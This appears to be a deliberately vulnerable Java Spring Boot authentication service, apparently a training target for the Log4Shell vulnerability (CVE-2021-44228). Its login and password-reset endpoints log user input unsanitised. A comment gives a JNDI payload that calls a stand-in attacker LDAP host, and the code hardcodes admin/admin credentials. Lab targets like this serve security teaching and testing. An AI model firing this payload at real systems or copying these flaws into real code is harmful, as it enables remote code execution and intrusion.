package com.hafb.auth;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;

import java.util.HashMap;
import java.util.Map;

/**
 * HAFB Auth Service
 * ⚠️ INTENTIONALLY VULNERABLE — Uses Log4j 2.14.1 (CVE-2021-44228)
 *
 * Vulnerability: The username field is logged directly using Log4j.
 * A JNDI payload in the username triggers remote code execution.
 */
@SpringBootApplication
@RestController
public class AuthServiceApplication {

    // ⚠️ Vulnerable logger — Log4j 2.14.1
    private static final Logger logger = LogManager.getLogger(AuthServiceApplication.class);

    public static void main(String[] args) {
        SpringApplication.run(AuthServiceApplication.class, args);
    }

    @GetMapping("/")
    public ResponseEntity<Map<String, String>> index() {
        Map<String, String> response = new HashMap<>();
        response.put("service", "HAFB Auth Service");
        response.put("status", "running");
        response.put("version", "1.0.0");
        return ResponseEntity.ok(response);
    }

    @GetMapping("/health")
    public ResponseEntity<Map<String, String>> health() {
        Map<String, String> response = new HashMap<>();
        response.put("status", "UP");
        return ResponseEntity.ok(response);
    }

    /**
     * Login endpoint — logs the username directly.
     * ⚠️ VULNERABLE: username is passed to logger.info() without sanitization.
     * Payload: {"username": "${jndi:ldap://attacker-ip:1389/exploit}", "password": "anything"}
     */
    @PostMapping("/login")
    public ResponseEntity<Map<String, String>> login(@RequestBody Map<String, String> body) {
        String username = body.getOrDefault("username", "");
        String password = body.getOrDefault("password", "");

        // ⚠️ THIS LINE IS VULNERABLE — Log4j processes JNDI lookups in logged strings
        logger.info("Login attempt for user: {}", username);

        Map<String, String> response = new HashMap<>();

        // Simple hardcoded auth for demo
        if ("admin".equals(username) && "admin".equals(password)) {
            logger.info("Successful login for user: {}", username);
            response.put("status", "success");
            response.put("message", "Welcome, " + username);
            response.put("role", "admin");
        } else {
            logger.warn("Failed login attempt for user: {}", username);
            response.put("status", "failure");
            response.put("message", "Invalid credentials");
        }

        return ResponseEntity.ok(response);
    }

    /**
     * Password reset endpoint — also logs user input.
     * Second injection point for demonstration.
     */
    @PostMapping("/reset")
    public ResponseEntity<Map<String, String>> reset(@RequestBody Map<String, String> body) {
        String email = body.getOrDefault("email", "");

        // ⚠️ ALSO VULNERABLE
        logger.info("Password reset requested for: {}", email);

        Map<String, String> response = new HashMap<>();
        response.put("status", "sent");
        response.put("message", "Reset link sent to " + email);
        return ResponseEntity.ok(response);
    }
}